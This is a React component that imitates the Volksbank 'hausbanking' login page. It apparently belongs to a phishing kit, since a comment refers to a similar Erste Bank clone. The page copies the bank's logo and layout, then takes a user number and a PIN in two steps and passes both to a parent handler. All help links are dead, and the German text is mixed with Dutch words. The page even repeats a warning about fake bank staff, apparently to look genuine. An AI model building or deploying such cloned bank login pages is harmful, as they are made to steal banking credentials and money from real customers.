"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Volksbanken({ formData, onChange, handleRouteAction, saving }: Props) {
  // Just like Erste Bank, Volksbank uses a 2-step process: Username first, then Password.
  // We'll implement the 2-step flow here within the same component.
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen font-sans flex flex-col relative bg-white">
      {/* Background Layer: Split Blue/White Gradient */}
      <div className="absolute inset-0 -z-10 flex flex-col">
        <div className="h-[64px] bg-white w-full"></div>
        <div className="flex-1 bg-gradient-to-b from-[#d9eef9] to-[#eaf5fb] w-full relative overflow-hidden">
          {/* Very subtle background light rays (approximating the visual) */}
          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-white/20 -translate-y-1/2 rotate-[-5deg] scale-150 transform"></div>
          <div className="absolute top-1/2 left-0 w-full h-[200px] bg-white/20 -translate-y-1/2 rotate-[5deg] scale-150 transform"></div>
        </div>
      </div>

      {/* Header Logo */}
      <div className="w-full max-w-[1024px] mx-auto h-[64px] flex items-center px-4 md:px-8 shrink-0">
        <div className="flex flex-col">
          <div className="flex items-center gap-1.5">
            {/* Volksbank V logo */}
            <svg width="32" height="24" viewBox="0 0 40 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-[#004e9a]">
              <path d="M0 0h12.5L20 18.5 27.5 0H40L20 30 0 0z" fill="currentColor"/>
              <path d="M7 0h26v4H7z" fill="white"/>
            </svg>
            <span className="text-[#004e9a] font-bold text-[24px] tracking-tight uppercase leading-none">VOLKSBANK</span>
          </div>
          <span className="text-[#666] text-[10px] uppercase font-bold tracking-widest ml-10 -mt-0.5">HAUSBANKING</span>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col items-center pt-8 md:pt-16 px-4">
        
        {/* Login Card */}
        <div className="w-full max-w-[600px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.08)] flex flex-col">
          
          {/* Blue Title Bar */}
          <div className="bg-[#1b65b4] text-white px-6 py-4">
            <h1 className="text-[20px] font-bold">hausbanking Login</h1>
          </div>

          <div className="p-6 md:p-8">
            
            {/* Red Warning Banner */}
            <div className="bg-[#c80000] text-white p-4 flex gap-4 mb-6 shadow-sm">
              <div className="shrink-0 mt-0.5">
                <svg className="w-8 h-8" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2L1 21h22L12 2zm0 3.5l8 14H4l8-14zm-1 3.5v5h2v-5h-2zm0 7v2h2v-2h-2z" fill="#c80000"/>
                  <path d="M12 2L1 21h22L12 2z" fill="white"/>
                  <path d="M11 9h2v5h-2V9zm0 7h2v2h-2v-2z" fill="#c80000"/>
                </svg>
              </div>
              <div className="flex flex-col gap-1.5">
                <p className="font-bold text-[14px]">Achtung: Anrufe FALSCHER Bankmitarbeiter!</p>
                <p className="text-[13px] leading-snug">
                  <span className="font-bold">NIEMALS</span> Passwörter, Gebruikersnaamn oder Codes nennen.
                </p>
                <p className="text-[13px] leading-snug">
                  <span className="font-bold">SOFORT</span> auflegen, wenn Sie danach gefragt werden.
                </p>
              </div>
            </div>

            {/* Info Text */}
            <p className="text-[#333] text-[14px] leading-relaxed mb-6">
              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
            </p>

            {/* Form */}
            <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col w-full">
              
              {/* Label & Links Row */}
              <div className="flex justify-between items-end mb-2 border-b border-gray-200 pb-2">
                <span className="text-[#666] text-[12px]">
                  {step === 1 ? "Anmeldung mit Gebruikersnaam" : "Wachtwoord eingeben"}
                </span>
                <div className="text-[13px] text-[#1b65b4]">
                  <a href="#" className="hover:underline">Barrierefrei</a>
                  <span className="text-gray-400 mx-1.5">|</span>
                  <a href="#" className="hover:underline">English</a>
                </div>
              </div>

              {/* Input Field */}
              <div className="mt-3 w-full">
                {step === 1 ? (
                  <input 
                    type="text" 
                    required
                    autoFocus
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-white text-[#333] text-[16px] transition-colors shadow-inner"
                  />
                ) : (
                  <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                    <input 
                      type="password" 
                      required
                      autoFocus
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[46px] bg-[#f0f0f0] border border-[#d0d0d0] rounded-[4px] px-4 outline-none focus:border-[#1b65b4] focus:bg-white text-[#333] text-[16px] transition-colors shadow-inner"
                    />
                  </div>
                )}
              </div>

              {/* Terms Notice */}
              <p className="text-[#666] text-[12px] text-center mt-4 px-4 leading-tight">
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
              </p>

              {/* Action Button */}
              <div className="border-t border-gray-200 mt-6 pt-6">
                <button 
                  type="submit" 
                  disabled={saving}
                  className="w-full bg-[#1b65b4] hover:bg-[#14539a] text-white font-medium h-[44px] rounded-[4px] text-[15px] transition-colors disabled:opacity-70"
                >
                  {saving ? "Wird geladen..." : "Weiter"}
                </button>
              </div>
              
              {step === 2 && (
                <div className="mt-3">
                  <button 
                    type="button" 
                    onClick={() => setStep(1)}
                    className="w-full bg-transparent border border-[#1b65b4] text-[#1b65b4] hover:bg-blue-50 font-medium h-[44px] rounded-[4px] text-[15px] transition-colors"
                  >
                    Zurück
                  </button>
                </div>
              )}
            </form>

            {/* Bottom Help Links */}
            <div className="flex flex-col items-center mt-6 gap-1">
              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Gebruikersnaam vergessen?</a>
              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Wachtwoord vergessen?</a>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
